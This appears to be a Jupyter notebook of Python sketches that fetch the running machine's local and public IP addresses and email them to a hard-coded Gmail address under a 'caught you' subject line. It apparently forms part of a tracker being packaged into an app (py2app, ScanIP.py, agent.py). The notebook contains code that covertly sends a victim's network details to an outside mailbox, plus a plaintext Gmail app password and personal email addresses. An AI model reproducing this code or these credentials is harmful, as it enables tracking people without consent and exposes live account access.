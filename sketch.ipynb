{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from requests import get\n",
    "from socket import getfqdn, gethostbyname\n",
    "from os import popen\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    \n",
    "    print (\n",
    "        \" local: \", gethostbyname(getfqdn()), \"\\nglobal: \", get(\"http://ipconfig.in/ip\").text, \"\\n\",\n",
    "        \" local: \", popen(\"ipconfig getifaddr en0\").read(), \"global: \", popen(\"curl ifconfig.me\").read(), \"\\n\"\n",
    "        )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['ScanIP.py', 'agent.py', 'image.jpeg', 'setup.py', 'sketch.ipynb']\n"
     ]
    }
   ],
   "source": [
    "from subprocess import run, PIPE\n",
    "from shlex import split\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    print(\n",
    "        result := split(run([\"ls\"], stdout=PIPE).stdout.decode())\n",
    "        )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "from PIL import Image\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    Image.open(get(\"https://static.ngs.ru/news/2015/99/preview/6f3e934e7e2d0402bdf8113262ea14420b7da035_640.jpg\", stream=True).raw).show()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "04.08.2022 - 00:41:28\n"
     ]
    }
   ],
   "source": [
    "from datetime import datetime\n",
    "if __name__ == '__main__':\n",
    "    print(\n",
    "        datetime.now().strftime(\"%d.%m.%Y - %H:%M:%S\")\n",
    "    )\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Thu Aug  4 00:41:25 EEST 2022\\n'"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from os import popen\n",
    "popen('date').read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100    13  100    13    0     0     71      0 --:--:-- --:--:-- --:--:--    73\n"
     ]
    }
   ],
   "source": [
    "from email.mime.text import MIMEText\n",
    "from smtplib import SMTP\n",
    "\n",
    "def send():\n",
    "    subject = f\"Попался, который кусался! {popen('date').read()}\"\n",
    "    mail = f\"\"\"<!DOCTYPE html><html><body><br><input type=\"text\" value=\"Local : {popen(\"curl ifconfig.me\").read().strip()}\" size = \"25\" style=\"text-align:center\" readonly><br><br><input type=\"text\" value=\"Global : {popen(\"ipconfig getifaddr en0\").read().strip()}\" size = \"25\" style=\"text-align:center\" readonly></body></html>\"\"\"\n",
    "  \n",
    "    smtp = 'smtp.gmail.com'\n",
    "    sender = \"7kipgod@gmail.com\"\n",
    "    destination = \"svaller22@gmail.com\" # !!! enter where to send the message\n",
    "    \n",
    "    server = SMTP(smtp, 587)\n",
    "    server.starttls()\n",
    "    \n",
    "    application_passwords = \"eifjuipuczaxguxb\" # !!! create a password using the link for the sender's email\n",
    "    # https://myaccount.google.com/security#:~:text=%EE%97%8C-,%D0%9F%D0%B0%D1%80%D0%BE%D0%BB%D0%B8%20%D0%BF%D1%80%D0%B8%D0%BB%D0%BE%D0%B6%D0%B5%D0%BD%D0%B8%D0%B9,-%D0%9D%D0%B8%20%D0%BE%D0%B4%D0%BD%D0%BE%D0%B3%D0%BE\n",
    "    \n",
    "    try:\n",
    "        server.login(sender, application_passwords)\n",
    "        msg = MIMEText(mail,\"html\")\n",
    "        msg[\"Subject\"] = subject\n",
    "        msg['From'] = sender\n",
    "        msg['To'] = destination\n",
    "        server.sendmail(sender, destination, msg.as_string())\n",
    "        \n",
    "    except Exception: return print(\"ERROR\")\n",
    "\n",
    "if __name__ == \"__main__\": send()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100    13  100    13    0     0     70      0 --:--:-- --:--:-- --:--:--    74\n"
     ]
    }
   ],
   "source": [
    "from email_to import EmailServer, Message\n",
    "from os import popen\n",
    "\n",
    "def shape():\n",
    "  subject = f\"Попался, который кусался! {popen('date').read()}\"\n",
    "  mail = f\"\"\"<!DOCTYPE html><html><body><br><input type=\"text\" value=\"Local : {popen(\"curl ifconfig.me\").read().strip()}\" size = \"25\" style=\"text-align:center\" readonly><br><br><input type=\"text\" value=\"Global : {popen(\"ipconfig getifaddr en0\").read().strip()}\" size = \"25\" style=\"text-align:center\" readonly></body></html>\"\"\"\n",
    "  \n",
    "  smtp = 'smtp.gmail.com'\n",
    "  sender = \"7kipgod@gmail.com\"\n",
    "  destination = \"svaller22@gmail.com\" # !!! enter where to send the message\n",
    "  \n",
    "  application_passwords = \"eifjuipuczaxguxb\" # !!! create a password for the app bot and get the password by putting it in brackets : https://myaccount.google.com/apppasswords\n",
    "  \n",
    "  EmailServer(smtp, 587, sender, application_passwords).send_message(Message(mail), destination, subject)\n",
    "\n",
    "if __name__ == \"__main__\": shape()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Cloning into 'finder'...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting email\n",
      "  Using cached email-4.0.2.tar.gz (1.2 MB)\n",
      "  Preparing metadata (setup.py): started\n",
      "  Preparing metadata (setup.py): finished with status 'error'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  error: subprocess-exited-with-error\n",
      "  \n",
      "  × python setup.py egg_info did not run successfully.\n",
      "  │ exit code: 1\n",
      "  ╰─> [1 lines of output]\n",
      "      ERROR: Can not execute `setup.py` since setuptools is not available in the build environment.\n",
      "      [end of output]\n",
      "  \n",
      "  note: This error originates from a subprocess, and is likely not a problem with pip.\n",
      "error: metadata-generation-failed\n",
      "\n",
      "× Encountered error while generating package metadata.\n",
      "╰─> See above for output.\n",
      "\n",
      "note: This is an issue with the package mentioned above, not pip.\n",
      "hint: See above for details.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: secure-smtplib in /Users/v.syroiezhin/opt/anaconda3/lib/python3.9/site-packages (0.1.1)\n",
      "Requirement already satisfied: Pillow in /Users/v.syroiezhin/opt/anaconda3/lib/python3.9/site-packages (9.0.1)\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100    13  100    13    0     0     69      0 --:--:-- --:--:-- --:--:--    71\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from os import system, getcwd\n",
    "system(\"git clone https://github.com/syroiezhin/console2app finder\")\n",
    "system(\"python3 ScanIP.py\")\n",
    "system(f\"rm -rf {getcwd()}/finder\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "py2app = 0.28.2 \n",
      "requests = 2.28.1 \n",
      "PIL = 9.0.1 \n",
      "email_to = 0.1.0\n"
     ]
    }
   ],
   "source": [
    "import py2app,requests,PIL,datetime,email_to\n",
    "print (\n",
    "\"\\npy2app =\",\n",
    "py2app.__version__\n",
    ", \"\\nrequests =\",\n",
    "requests.__version__\n",
    ", \"\\nPIL =\",\n",
    "PIL.__version__\n",
    ", \"\\nemail_to =\",\n",
    "email_to.__version__\n",
    ")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.12 ('base')",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.12"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "5f23284fad75d58360d212629b595dfe6fd02dbd8325e77387b1e5cbaad4e030"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
